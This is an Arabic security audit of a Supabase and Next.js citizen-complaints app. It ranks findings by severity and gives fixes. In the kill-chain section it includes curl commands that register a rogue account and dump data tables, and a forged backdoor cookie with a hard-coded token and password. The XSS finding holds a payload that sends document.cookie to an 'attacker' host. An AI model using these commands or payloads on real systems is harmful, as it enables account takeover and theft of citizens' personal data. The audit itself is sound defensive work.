# المراجعة الأمنية — mostaqbal-shabab

**تاريخ المراجعة:** 1 نوفمبر 2026
**النطاق:** كود المشروع + إعدادات مشروع Supabase البعيد (قراءة فقط)
**الطريقة:** مراجعة كود يدوية + طلبات GET/RPC آمنة. لم يُنشأ أي حساب ولم تُكتب أي بيانات.

> **تحديث — 3 نوفمبر 2026 (نموذج كلمة السر الواحدة):**
> أُعيد بناء الدخول على **كلمة سر واحدة فقط** لهوية واحدة (المهندس / محمد العزب)، بدون بريد أو اسم مستخدم وبدون أدوار متعددة. لا يُستخدم Supabase Auth للهوية.
>
> - كلمة السر في `ADMIN_LOGIN_PASSWORD` (خادمي فقط).
> - الجلسة موقّعة HMAC-SHA256 في كوكي `HttpOnly` باستخدام `ADMIN_SESSION_SECRET`.
> - `proxy.ts` و`getSessionProfile()` يتحققان من التوقيع والانتهاء.
> - أُغلق الباب الخلفي القديم، وأُزيل `staff`/`citizen` و`/auth/callback`.
> - أُضيفت هجرة `supabase/migrations/20261103_p1_p2_hardening.sql` لحدود الإدخال وتقييد حذف الحسابات.
> - عولج XSS المخزّن في مولّدات PDF، وأُزيلت بيانات PII التجريبية من الحزمة والسكيما.
>
> **ما زال مطلوباً يدوياً:**
> 1. إغلاق التسجيل في Supabase (Dashboard → Authentication → Email → تعطيل Enable sign up)، حتى مع عدم استخدام Supabase Auth.
> 2. تنفيذ هجرتي P0 وP1/P2 في SQL Editor على المشروع البعيد.
> 3. ضبط `ADMIN_LOGIN_PASSWORD` و`ADMIN_SESSION_SECRET` في بيئة الخادم.
>
> **ملاحظة معمارية:** سياسات RLS الإدارية تعتمد على `auth.uid()` من Supabase Auth. مع الدخول بكلمة سر فقط، لم يعد العميل يقرأ/يكتب بيانات الشكاوى بصلاحية الأدمن عبر RLS؛ راجع `SECURITY.md` القسم 4 لخيارات المعالجة قبل الإنتاج.

---

## 1) الملخص التنفيذي

النظام حالياً **غير آمن للنشر**. المشكلة ليست ثغرة واحدة، بل ثلاث طبقات فشلت في نفس الوقت:

1. **باب خلفي للمصادقة** في الكود: كوكي ثابت + كلمة مرور موحدة مكتوبة في المستودع.
2. **التسجيل العام مفعّل** على Supabase، وكل مستخدم جديد يُمنح `role='admin'` تلقائياً.
3. **دوال فحص الدور ترجع `true` دائماً**، فأي مستخدم مصادق — بل أي شخص يكتب الكوكي — يُعتبر سوبر أدمن.

النتيجة: يمكن لأي شخص على الإنترنت، بدون أي بيانات دخول، الوصول إلى لوحة الإدارة، وقراءة وتعديل وحذف **كل الشكاوى** (أسماء، أرقام قومية، هواتف، ملاحظات داخلية) و**كل الملفات الشخصية**، وحذف حسابات فريق العمل.

| الخطورة | العدد | الوصف المختصر |
|---|---|---|
| P0 — حرج | 4 | تسجيل → أدمن، باب خلفي بالكوكي، كلمة مرور ثابتة، دوال أدوار معطّلة |
| P1 — مرتفع | 6 | XSS مخزّن، PII في حزمة العميل، تخزين عام، حراس خاطئة، حذف أي حساب من أي أدمن، RLS الملفات الشخصية |
| P2 — متوسط | 8 | تسريب `admin_notes`، تجاوز Auth Admin API، غياب Rate Limiting، ثغرة `xlsx`، CSP ضعيف، إلخ |

---

## 2) سلسلة الهجوم الأكثر خطورة (Kill Chain)

> لا تحتاج أي حساب ولا أي خبرة. أربع خطوات.

**الخطوة 1 — إنشاء حساب أدمن مجاناً**
```bash
curl -X POST "https://<project>.supabase.co/auth/v1/signup" \
  -H "apikey: <anon-key>" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"Passw0rd!123"}'
```
`disable_signup=false` على المشروع البعيد (تم التحقق). المُهاجم يملك البريد، فيؤكد الرسالة ويحصل على جلسة `authenticated`.

**الخطوة 2 — التريجر يمنحه أدمن**
`handle_new_user` يُدرج الصف بـ `role='admin'`
(`supabase/schema.sql:1002-1027` و `supabase/migrations/20261101_admin_only.sql:31-56`).

**الخطوة 3 — `is_admin()` ترجع true**
لأن الدور `admin`، تصبح كل سياسات RLS مفتوحة:
`supabase/schema.sql:560-604` (الشكاوى) و `:1199-1201` (الملفات الشخصية).

**الخطوة 4 — سحب كل البيانات**
```bash
curl "https://<project>.supabase.co/rest/v1/complaints?select=*" \
  -H "apikey: <anon>" -H "Authorization: Bearer <access_token>"
curl "https://<project>.supabase.co/rest/v1/profiles?select=*" \
  -H "apikey: <anon>" -H "Authorization: Bearer <access_token>"
```
النتيجة: الأرقام القومية، الهواتف، العناوين، `admin_notes`، وبيانات المشرفين. وبصلاحية `admin` يستطيع أيضاً `DELETE` على الجدول، و`POST /rpc/admin_remove_staff` لحذف حسابات أخرى.

**مسار بديل أقصر — بدون تسجيل أصلاً:**
```js
document.cookie = "mostaqbal_admin_session=mostaqbal_azab_secure_authenticated_token_2025; path=/";
```
ثم فتح `/admin`. `proxy.ts:25-28` و `server.ts:61-75` و `auth.ts:43-58` يقبلونها ويُعيدون كائن سوبر أدمن كامل.

---

## 3) النتائج بالتفصيل

### P0-1 — التسجيل العام يمنح صلاحية أدمن تلقائياً

**الموقع**
- إعداد Supabase البعيد: `disable_signup = false` (تم التحقق عبر Management API، قراءة فقط).
- `supabase/schema.sql:1002-1027`
- `supabase/migrations/20261101_admin_only.sql:31-56`

**الدليل**
```sql
-- handle_new_user
insert into public.profiles (..., role, is_super_admin)
values (..., 'admin', false)   -- كل مستخدم جديد = admin
```

**التأثير**
أي شخص يملك بريداً إلكترونياً يصبح أدمن كامل على قاعدة البيانات. هذا تسريب كامل لبيانات المواطنين، ويشمل القدرة على الحذف والتعديل.

**الإصلاح (فوري)**
1. في Supabase Dashboard → Authentication → Providers → Email: أغلق **Enable sign up**.
   أو عبر Management API: `PATCH /v1/projects/{ref}/config/auth` بـ `{"disable_signup": true}`.
2. أغلق أيضاً Anonymous Sign-ins إن كانت مفعّلة.
3. اجعل التريجر يفشل لأي مستخدم لم يُنشأ إدارياً — `raw_app_meta_data` لا يستطيع العميل تعديله:
```sql
if coalesce(new.raw_app_meta_data->>'provisioned_by','') <> 'admin' then
  raise exception 'التسجيل الذاتي معطّل' using errcode = '42501';
end if;
```
4. نفّذ هجرة تنظيف: `update public.profiles set role='admin'` لن يضر بعد إغلاق التسجيل، لكن راجع كل صف أُنشئ بعد تاريخ النشر واحذف غير المعروف.

---

### P0-2 — باب خلفي: كوكي ثابت يمنح سوبر أدمن

**الموقع**
- `src/proxy.ts:25-28`
- `src/lib/supabase/server.ts:61-75`
- `src/lib/auth.ts:43-58`
- `src/app/api/auth/login/route.ts:4`

**الدليل**
```ts
if (adminSession === 'mostaqbal_azab_secure_authenticated_token_2025') {
  return NextResponse.next({ request });
}
```

**التأثير**
الكوكي غير موقّعة وغير مرتبطة بجلسة، ونصّها موجود في حزمة JavaScript العامة. أي زائر يكتبها يدوياً يتجاوز `proxy` و`requireUser` و`requireStaff` و`requireAdmin`. حالياً معظم جلب البيانات يتم من العميل عبر Supabase (فلا تكفي الكوكي وحدها لقراءة الجدول)، لكن:
- الواجهة الإدارية الكاملة تُفتح، بما فيها `/admin/users`.
- أي Server Action أو كود خادم يعتمد على `require*` سيُنفّذ بصلاحية سوبر أدمن (لا يوجد حالياً، لكنه فخّ جاهز).
- تتضاعف خطورتها مع P1-1 (XSS) لأن الكوكي قابلة للقراءة بـ JS.

**الإصلاح**
- احذف مسار الكوكي بالكامل من الملفات الثلاثة ومن `login/route.ts`.
- اجعل `/login` يعتمد على `supabase.auth.signInWithPassword` فقط.
- إذا كنت تحتاج "وضع عرض" مؤقتاً، اجعله خلف متغير بيئة خادمي + كوكي عشوائية `httpOnly; secure; sameSite=strict` تُصدر من الخادم، ولا تضع النص في العميل أبداً.

---

### P0-3 — كلمة مرور موحدة مثبتة في الكود

**الموقع:** `src/app/api/auth/login/route.ts:3,20,42-47`

**الدليل**
```ts
export const OFFICIAL_UNIFIED_PASSWORD = 'azab12345';
...
if (trimmed !== OFFICIAL_UNIFIED_PASSWORD) { ... }
```

**التأثير**
- كلمة المرور في المستودع وفي حزمة الخادم، عمرها غير محدود، وكل من رآها (موظف سابق، نسخة من المشروع، سجل git) يملك الدخول.
- لا Rate Limiting ولا قفل حسابات ولا MFA → تخمين غير محدود.
- الكوكي `httpOnly: false` + `secure` غير مفعّل + `maxAge` 30 يوماً + توكن ثابت لا يتغيّر عند الخروج → سرقة وإعادة استخدام دائمة.

**الإصلاح**
- احذف الكلمة الثابتة وroute الـ login المخصص. استخدم Supabase Auth.
- إن أبقيت أي كوكي: `httpOnly: true, secure: true, sameSite: 'strict'`, وتوكن عشوائي يُنشأ لكل جلسة.
- أضف Rate Limiting (Upstash/Redis أو middleware) وقفل مؤقت بعد المحاولات الفاشلة.
- اعتبر `azab12345` و`mostaqbal_azab_secure_authenticated_token_2025` **محروقين** — غيّرهما فوراً حتى لو أزلت الكود.

---

### P0-4 — دوال فحص الدور ترجع `true` دائماً

**الموقع**
- `src/lib/auth/types.ts:86-100`
- `src/lib/auth/types.ts:124-143`
- `src/lib/supabase/server.ts:99-113`

**الدليل**
```ts
export function normalizeRole(_value: unknown): UserRole { return 'admin'; }
export function isAdminRole(_role): boolean { return true; }
export function isStaffRole(_role): boolean { return true; }
...
role: 'admin',   // profileToAdminUser يفرض الدور
```

**التأثير**
هذه هي النقطة التي تُبطل كل الحراس. `requireStaff` و`requireAdmin` لا يحميان شيئاً. وحتى مستخدم بلا صف `profile` (سطر 101-111) يتحول إلى أدمن. النتيجة أن أي حساب مصادق — بما فيه حساب أُنشئ من التسجيل العام — يمرّ من كل الفحوص.

**الإصلاح**
- أعد تعريف `UserRole` ليشمل الأدوار الحقيقية، واجعل:
```ts
isAdminRole  = (r) => r === 'admin';
isStaffRole  = (r) => r === 'admin' /* أو 'staff' */;
normalizeRole = (v) => (v === 'admin' ? 'admin' : 'citizen');
profileToAdminUser = (row) => ({ ..., role: row.role ?? 'citizen' });
```
- احذف فرع "لا يوجد profile ⇒ أدمن" واجعله `null` أو `citizen`.
- الأفضل: لا تعتمد على `role` من `profiles` فقط؛ أضف `is_super_admin` كفحص منفصل في `requireAdmin`.

---

### P1-1 — XSS مخزّن في توليد PDF/الطباعة (يؤدي لسرقة الجلسة)

**الموقع**
- `src/lib/generateSinglePdf.ts:65,67,71,73,84,91,101` ثم `container.innerHTML = html` في `:141`
- `src/lib/generateBulkPdf.ts:38,93-98` ثم `printWindow.document.write(...)` في `:155`

**السبب**
كل حقول الشكوى (`citizen_name`, `title`, `description`, `admin_notes`, `location_address`) تُدرج في قوالب HTML بدون تهريب.

**التأثير**
شكوى بعنوان:
```html
<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">
```
تُنفّذ في متصفح الأدمن لحظة فتح صفحة الطباعة أو تصدير PDF. ومعها:
- الكوكي `mostaqbal_admin_session` (غير HttpOnly).
- محتوى `localStorage` (كل الشكاوى التجريبية).
- إمكانية تنفيذ طلبات same-origin بجلسة الأدمن.

**الإصلاح**
- أضف دالة تهريب مركزية واستخدمها على **كل** حقل:
```ts
const esc = (v: unknown) => String(v ?? '').replace(/[&<>"']/g, c =>
  ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]!));
```
- بدّل `document.write`/`innerHTML` بـ DOM APIs (`textContent`) أو استخدم `DOMPurify` مع قائمة سماح صارمة.
- أضف `Content-Security-Policy` حقيقية تمنع `inline` و`eval`.

---

### P1-2 — بيانات مواطنين تجريبية داخل حزمة العميل و`localStorage`

**الموقع**
- `src/lib/complaintsService.ts:6-330` (أرقام قومية وهواتف وعناوين)
- `src/lib/complaintsService.ts:332-378` (الكتابة إلى `localStorage`)
- `src/lib/complaintsService.ts:389-404` (fallback يعرضها لأي زائر)
- `supabase/schema.sql:848+` (نفس البيانات كـ seed في قاعدة البيانات)

**التأثير**
- الملف يُستورد في مكوّنات العميل، فبيانات "المواطنين" تُحمَّل مع JavaScript لأي زائر، حتى بدون تسجيل دخول.
- `getLocalComplaints()` يكتبها في `localStorage` لأي زائر عند أول تحميل.
- إن كانت أي قيمة حقيقية (ولو جزئياً) فهذا تسريب PII. وإن كانت وهمية، فهي تدرّب المستخدمين على خلط الوهمي بالحقيقي وتُظهر بيانات لا يجب أن تُشحن.

**الإصلاح**
- احذف `INITIAL_DEMO_COMPLAINTS` من الحزمة نهائياً، أو ضعها في ملف يُحمّل فقط في `NODE_ENV=development`.
- استبدل كل رقم قومي/هاتف بقيم مستحيلة الاستخدام (`00000000000000`, `01000000000`).
- احذف قسم seed من `schema.sql` قبل أي نشر.
- لا تكتب بيانات شكاوى في `localStorage`؛ استخدم `sessionStorage` أو لا تحفظ شيئاً.

---

### P1-3 — تخزين عام + رفع مجهول

**الموقع**
- `supabase/schema.sql:812-842`
- `src/lib/supabaseStorage.ts:25-41`

**الدليل**
```sql
'complaint-media', true, 26214400, ...
CREATE POLICY "Public Upload To complaint-media" ... TO anon, authenticated ...
```
```ts
const { data } = supabase.storage.from(BUCKET).getPublicUrl(data.path);
```

**التأثير**
- أي زائر يرفع حتى 25MB بلا حدّ عددي → إغراق التخزين/التكلفة، واستضافة محتوى غير قانوني باسم الحزب.
- الروابط دائمة وعامة: من يحصل على رابط يرى المرفق للأبد، حتى لو حُذفت الشكوى (الملف يبقى).
- إذا رفع مواطن صورة بطاقة رقم قومي، تصبح متاحة لأي شخص يملك الرابط.
- حاوية `avatars` عامة والقراءة مسموحة لـ `anon` (تم التحقق: `list` يعيد كائنات) → صور المشرفين قابلة للجرد.

**الإصلاح**
- اجعل `complaint-media` **خاصاً** (`public=false`) واستخدم Signed URLs قصيرة العمر عبر Route Handler يصادق أولاً.
- انقل الرفع إلى الخادم: تحقق من الحجم، وافحص MIME فعلياً (magic bytes) لا من `file.type`، وأعد تسمية الملف، وأضف Rate Limit.
- أضف سياسة حذف/تنظيف للمرفقات اليتيمة.
- اجعل `avatars` خاصة أو مقصورة على `authenticated` مع منع الجرد.

---

### P1-4 — حراس صفحات الإدارة يستخدمون `requireUser` فقط

**الموقع**
- `src/app/admin/layout.tsx:28` → `requireUser('/admin')`
- `src/app/admin/users/layout.tsx:17` → `requireUser('/admin/users')`

**التأثير**
`/admin` لا يتحقق من كون المستخدم staff، و`/admin/users` لا يتحقق من `is_super_admin` على الخادم إطلاقاً. الحماية الوحيدة هناك هي `proxy.ts:63-75`، وهي قابلة للتجاوز بالكوكي (P0-2) ومعطّلة بسبب P0-4.

**الإصلاح**
```ts
// admin/layout.tsx
const user = await requireStaff('/admin');
if (!isStaffRole(user.role)) redirect('/account');
// admin/users/layout.tsx
await requireAdmin('/admin/users');
```
وأضف فحص `is_super_admin` صريحاً في layout المستخدمين، لا تعتمد على `proxy` وحده.

---

### P1-5 — `admin_remove_staff` تسمح لأي أدمن بحذف أي حساب آخر (غير السوبر أدمن)

**الموقع:** `supabase/schema.sql:779-799`

**الدليل**
```sql
IF NOT public.is_admin() THEN ...
IF p_target = auth.uid() THEN ...
DELETE FROM auth.users WHERE id = p_target;
```

**التأثير**
أي أدمن (وكل المستخدمين أدمن حالياً) يستطيع حذف أي حساب آخر. السوبر أدمن محمي
فعلياً بتريجر `protect_super_admin_delete` الذي يمنع حذف صف `is_super_admin`،
لكن بقية الحسابات (بما فيها حسابات فريق العمل) قابلة للحذف من أي أدمن عادي.
هذا توسيع غير ضروري للصلاحيات (privilge scope)، وليس تصعيداً كاملاً.

**الإصلاح**
- اشترط `is_super_admin()` للتنفيذ، وليس `is_admin()`.
- أو احذف الدالة واستخدم `delete_admin_user` (فيها فحص super admin) أو
  Supabase Admin API من الخادم.

---

### P1-6 — سياسات `profiles` تسمح بقراءة الجميع وتعديل `role`

**الموقع**
- `supabase/schema.sql:1199-1201` (select for authenticated using true)
- `supabase/schema.sql:1203-1207` (update own)

**التأثير**
- أي مستخدم مصادق يقرأ كل الملفات: البريد، `is_super_admin`، الصور → خريطة كاملة للمشرفين.
- `profiles_update_own` لا يقيّد الأعمدة: المستخدم يستطيع تعديل `role` مباشرة عبر PostgREST (قيد `role='admin'` الحالي يمنع التصعيد الآن، لكنه يفشل لحظة إعادة إدخال أدوار أخرى).
- كما أن `WITH CHECK` يحتوي subquery على نفس الجدول، وهو نمط هشّ وقد يسبب recursion أو نتائج غير متوقعة.

**الإصلاح**
```sql
-- دالة مساعدة SECURITY DEFINER لتفادي recursion
create or replace function public.is_super_admin()
returns boolean language sql stable security definer set search_path = public as
$$ select coalesce((select p.is_super_admin from public.profiles p where p.id = auth.uid()), false) $$;

drop policy if exists profiles_select_all on public.profiles;
create policy profiles_select_own on public.profiles
  for select to authenticated using (id = auth.uid() or public.is_super_admin());

revoke update on public.profiles from authenticated;  -- التعديل فقط عبر RPC
```
وحدّث `update_own_profile` لتعديل `full_name/username/avatar_url` فقط (هو كذلك بالفعل).

---

### P2-1 — `admin_notes` مكشوفة للمواطن عبر RLS

**الموقع:** `supabase/schema.sql:560-573` + `:582-598`

**التأثير**
سياسة `citizen_id = auth.uid()` تمنح صاحب الشكوى قراءة **الصف كامل**، بما فيه `admin_notes` (الملاحظات الداخلية). الواجهة تخفيها، لكن REST يعيدها. حالياً لا يوجد تسجيل مواطنين، لكن هذه قنبلة موقوتة عند عودته. الشيء نفسه في `track_complaints` — هناك حجب صحيح لـ `admin_notes`، لكن RLS المباشرة لا تحجب.

**الإصلاح**
- افصل الملاحظات الداخلية في جدول `complaint_internal_notes` بصلاحية admin فقط.
- أو استخدم `GRANT SELECT (columns)` لعمود محدد وامنع `SELECT *` على الجدول للمواطن.

---

### P2-2 — `create_admin_user` يتجاوز Auth Admin API

**الموقع:** `supabase/schema.sql:1081-1140` و`:1090`

**التأثير**
- إدراج مباشر في `auth.users` يتجاوز تأكيد البريد، و`auth.identities`، وسياسات كلمة المرور، وقد ينكسر مع ترقيات Supabase.
- `set search_path = public, extensions` يضع `public` أولاً → خطر اختطاف الدوال (`crypt`, `gen_salt`) إذا استطاع أحد إنشاء كائنات في `public`.
- الدالة SECURITY DEFINER وتعمل بصلاحية عالية جداً.

**الإصلاح**
- استخدم `supabase.auth.admin.createUser` من Route Handler خادمي بمفتاح `service_role` (لا يصل للمتصفح أبداً).
- إن أبقيت الدالة: `set search_path = extensions` مع تأهيل كل الجداول، وافحص `is_super_admin()` قبل أي شيء.

---

### P2-3 — لا Rate Limiting ولا حدود على المدخلات

**الموقع**
- `src/app/api/auth/login/route.ts` (تخمين غير محدود)
- `supabase/schema.sql:645-706` (`submit_complaint`: لا حدّ لطول الحقول، لا تحقق من صيغة الرقم القومي/الهاتف)
- `supabase/schema.sql:717-752` (`track_complaints`: متاح لـ anon)
- `src/lib/supabaseStorage.ts` (رفع غير محدود عدداً)

**التأثير**
تخمين كلمة المرور، إغراق قاعدة البيانات بشكاوى وهمية، استنزاف التخزين، ومحاولة تخمين أكواد التتبع (الهاتف + كود/رقم قومي). غياب حدود الطول يسمح بحقن JSONB ضخم.

**الإصلاح**
- Rate Limit على مستوى IP + المسار (مثلاً 5 محاولات/دقيقة للدخول، 3 شكاوى/ساعة، 10 رفع/ساعة).
- `CHECK (length(title) <= 200)`, `length(description) <= 10000`, تحقق من صيغة الرقم القومي (14 رقماً) والهاتف المصري.
- تحقق من أن `attachments` ≤ 5 عناصر وأن كل `url` يبدأ بـ `https://<project>.supabase.co/storage/v1/`.

---

### P2-4 — حقول يتحكم بها العميل تُعامل كثقة

**الموقع**
- `src/app/submit/page.tsx:28` → `privacyAgreed` يبدأ `true`.
- `src/app/submit/page.tsx:199` → `is_confidential` يُرسل من العميل.
- `src/app/submit/page.tsx:107` → حد الرفع 25MB في العميل فقط.
- `src/app/account/ProfileEditor.tsx:56-63` → امتداد الأفاتار من اسم الملف، بلا فحص MIME.

**التأثير**
لا يوجد تحقق خادمي مطابق. يمكن تجاوز الموافقة على الخصوصية، وتغيير `is_confidential`، ورفع ملف بامتداد `.png` وهو HTML/JS (يُخزَّن ويُقدَّم من نطاق Supabase، لا من نطاقك، لكنه يظل إساءة استخدام).

**الإصلاح**
- `privacyAgreed` افتراضياً `false` وتحقق منه خادمياً.
- `is_confidential` يُحسب على الخادم حسب سياسة، لا من العميل.
- فحص MIME بالـ magic bytes وإعادة ترميز الصور على الخادم.

---

### P2-5 — ثغرة `xlsx` معروفة بلا إصلاح

**الموقع:** `package.json` → `xlsx ^0.18.5`

**التأثير**
`npm audit --omit=dev` يبلّغ عن Prototype Pollution + ReDoS (high). الاستخدام الحالي **كتابة فقط** (`exportExcel.ts`)، فلا يوجد مسار لقراءة ملفات غير موثوقة الآن. الخطر يتحول إلى حرج لو أُضيف استيراد Excel لاحقاً.

**الإصلاح**
- انتقل إلى `exceljs` أو `write-excel-file` (كتابة فقط، بلا ثغرات معروفة).
- أو ثبّت `xlsx` من مصدر رسمي محدّث وراقب CVE.

---

### P2-6 — ترويسات أمان ناقصة (CSP شكلية)

**الموقع:** `next.config.ts:3-16`

**الملاحظات**
- `Content-Security-Policy` تحتوي `frame-ancestors 'none'` فقط — لا `script-src`، لا `object-src`، لا `base-uri`، لا `form-action`. أي XSS يعمل بحرية.
- لا `Cache-Control: no-store` على `/admin` و`/account` و`/admin/print` → بيانات حساسة قد تبقى في كاش المتصفح على جهاز مشترك.
- `X-Frame-Options: DENY` جيد، لكنه مكرر مع CSP.

**الإصلاح**
- أضف CSP بـ nonce عبر middleware، على الأقل:
`default-src 'self'; script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests`
- أضف `Cache-Control: no-store, private` لمسارات الإدارة.

---

### P2-7 — تسجيل الخروج لا ينظّف حالة العميل

**الموقع:** `src/lib/auth.ts:147-169`

**التأثير**
`logout` يحذف كوكي الباب الخلفي ويسجّل خروج Supabase، لكنه لا يمسح `localStorage` (الشكاوى التجريبية) ولا `cachedUser` في كل المسارات. على جهاز مشترك، الشكاوى تبقى قابلة للقراءة بعد الخروج. كما أن الكوكي الثابتة لا تُبطَل من الخادم (لا قائمة إبطال).

**الإصلاح**
- امسح مفاتيح `mostaqbal_shabab_*` من `localStorage` عند الخروج.
- مع جلسات حقيقية: أبطِل refresh token من الخادم، ولا تعتمد على حذف الكوكي فقط.

---

### P2-8 — `SECURITY.md` لا يطابق الواقع

**الموقع:** `SECURITY.md`

**التأثير**
الوثيقة تدّعي عدم وجود كلمات مرور ثابتة واستخدام `requireStaff`/`requireAdmin`، وكلاهما غير صحيح. هذا يمنح إحساساً زائفاً بالأمان وقد يمنع مراجعة مستقبلية.

**الإصلاح**
أعد كتابته بعد الإصلاحات، مع ذكر نموذج التهديد، الأدوار، ما هو عام وما هو خاص، وإجراءات الإبلاغ.

---

## 4) ما تم التحقق منه وهو سليم

- `.env.local` يحتوي فقط على مفاتيح Supabase العامة (`sb_publishable_...`)، ولا يوجد `service_role` في الكود ولا في الحزمة (بحث شامل).
- `.env.local` غير متعقّب في git.
- `GET /rest/v1/complaints` و`/profiles` بمفتاح anon (بدون جلسة) يعيدان `[]` → RLS تحجب anon فعلاً.
- `POST /rpc/admin_remove_staff` بمفتاح anon يعيد `401 permission denied`.
- `track_complaints` تحجب `admin_notes` و`citizen_id` و`national_id` (تُقنّع) و`alt_contacts` و`location_*`، وتشترط الهاتف مع الكود/الرقم القومي.
- `submit_complaint` تضبط `citizen_id` و`status` و`priority` و`admin_notes` على الخادم، و`INSERT` المباشر مسحوب من `anon/authenticated`.
- ترويسات `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `HSTS` موجودة.
- `sanitizeNextPath` في `auth/types.ts:102-122` يمنع Open Redirect بشكل جيد.
- لا توجد Server Actions ولا `service_role` في كود التطبيق.

---

## 5) خطة الإصلاح المقترحة

### خلال 24 ساعة (يوقف الهجوم الحالي)
1. `disable_signup = true` + إغلاق Anonymous Sign-ins.
2. حذف الباب الخلفي للكوكي من `proxy.ts`, `server.ts`, `auth.ts`, `login/route.ts`.
3. تعطيل/حذف كلمة المرور الموحدة، والاعتماد على Supabase Auth.
4. تصحيح `isAdminRole`/`isStaffRole`/`profileToAdminUser`.
5. `requireStaff` و`requireAdmin` في layouts الإدارة.
6. تدوير/إبطال التوكن والكلمة القديمة نهائياً.
7. مراجعة سجلات Supabase Auth عن أي تسجيل مجهول خلال الفترة الماضية.

### خلال أسبوع
8. تهريب HTML في كل مولّدات PDF والطباعة + CSP حقيقية.
9. حذف بيانات PII التجريبية من الحزمة ومن `schema.sql`.
10. تقييد `profiles` RLS وإلغاء `UPDATE` المباشر.
11. تأمين `complaint-media` (خاص + Signed URLs) و`avatars`.
12. تقييد `admin_remove_staff` أو حذفها.
13. Rate Limiting على الدخول والتقديم والتتبع والرفع.
14. حدود طول وتحقق من الصيغ في `submit_complaint`.

### خلال شهر
15. استبدال `xlsx` أو قبول المخاطرة موثّقاً.
16. فصل `admin_notes` في جدول داخلي.
17. استبدال `create_admin_user` بـ Auth Admin API.
18. مراجعة `SECURITY.md` وكتابة runbook للحوادث.
19. إضافة تنبيهات (Supabase logs / Sentry) لأي `401/403` متكرر أو تسجيل جماعي.
20. نسخ احتياطي مشفّر واختبار استعادة.

---

## 6) ملاحظة أخيرة

أخطر ما في هذا النظام ليس ثغرة تقنية معقدة، بل أن **ثلاث آليات أمان مستقلة معطّلة في نفس الوقت**، وكل واحدة منها كانت كافية لوحدها لو عملت. الأولوية ليست إضافة حماية جديدة، بل **إعادة تشغيل** الحماية الموجودة: أغلق التسجيل، احذف الباب الخلفي، وأصلح دوال الأدوار. هذه الثلاثة تُغلق سلسلة الهجوم كاملة.
